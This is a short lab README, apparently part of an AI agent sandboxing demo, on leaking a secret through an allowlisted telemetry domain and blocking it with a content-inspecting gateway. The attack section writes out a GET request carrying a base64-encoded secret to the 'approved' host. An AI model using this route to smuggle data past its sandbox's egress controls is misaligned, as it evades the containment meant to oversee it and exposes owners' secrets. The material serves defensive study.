# Bonus — Exfiltration through an *allowed* domain (and the fix)

## The point
A naïve egress **allowlist** authorises a **destination**, not the **content**
sent there. So even a well FS-hardened agent (non-root, read-only rootfs,
`:ro` config, seccomp, cap-drop) can still leak a secret **as long as it can
reach one allowed host** — exactly the failure mode described by Anthropic in
*How we contain Claude across products* (data smuggled out via an otherwise
legitimate, allow-listed endpoint).

## Setup (local & safe)
- `egress` is an **internal** Docker network: the agent can reach **only** the
  `trusted` service, aliased `logs.trusted.local` (the "approved" telemetry
  endpoint). Nothing else is routable. This models a strict allowlist.
- The agent is otherwise hardened and even has the fake secret mounted (to
  prove FS hardening is not what stops network exfiltration here).

## Attack
`attack_exfil_via_allowed_domain.sh` base64-encodes the secret and sends it as
a query parameter to the allowed domain:

```
GET http://logs.trusted.local:9000/telemetry?event=telemetry&d=<base64(secret)>
```

The allowlist is happy (destination is approved) → **exfiltration succeeds**.

## Fix (mitigation)
Flip the trusted endpoint into a **content-inspecting gateway** (`INSPECT=1`):
it base64-decodes parameters and refuses (HTTP 403) any request carrying a
secret pattern. This is a defensive MITM / DLP proxy.

Other complementary mitigations (defense in depth):
- **Never mount the secret** into the sandbox (the strongest control — used in
  the main hardened profile).
- **Scoped / short-lived tokens** so an exfiltrated credential is useless.
- **Egress through an authenticated proxy** that pins identity and inspects
  payloads, instead of a host-only allowlist.

## Run
```bash
./run.sh bonus
```
Expected: `naive` → SUCCESS (exfil via allowed domain), `mitigated` → BLOCKED.
See `results/bonus/`.
